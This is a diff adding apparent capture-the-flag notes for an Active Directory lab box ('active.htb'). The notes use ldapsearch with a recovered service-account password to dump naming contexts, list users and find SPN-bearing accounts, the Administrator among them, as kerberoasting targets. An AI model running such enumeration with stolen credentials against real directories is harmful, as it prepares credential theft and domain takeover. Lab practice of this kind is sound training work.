@@ -1,0 +1,18 @@
+#LdapSearch Naming Context Dump
+    ldapsearch -h 10.10.10.100 -x -s base namingcontexts
+===========================================================================================
+#create list of users
+    ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb"   |  grep sAMAccountName | cut -d: -f2 | awk '{print $1}'
+============================================================================================
+# For lookup and found the user who can carry out kerberoating (Those accounts which have their Service Principal Name(SPN) set are kerberoastable. Usually these accounts are service accounts.)
+    ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" serviceprincipalname
+   
+   -> result: # Administrator, Users, active.htb
+                dn: CN=Administrator,CN=Users,DC=active,DC=htb
+                servicePrincipalName: active/CIFS:445
+
+              # SVC_TGS, Users, active.htb
+                dn: CN=SVC_TGS,CN=Users,DC=active,DC=htb
+                
+        ==>> So the administrator is configured with SPN that can be used for achieve a “kerberoasting”:
+=========================================================================================================
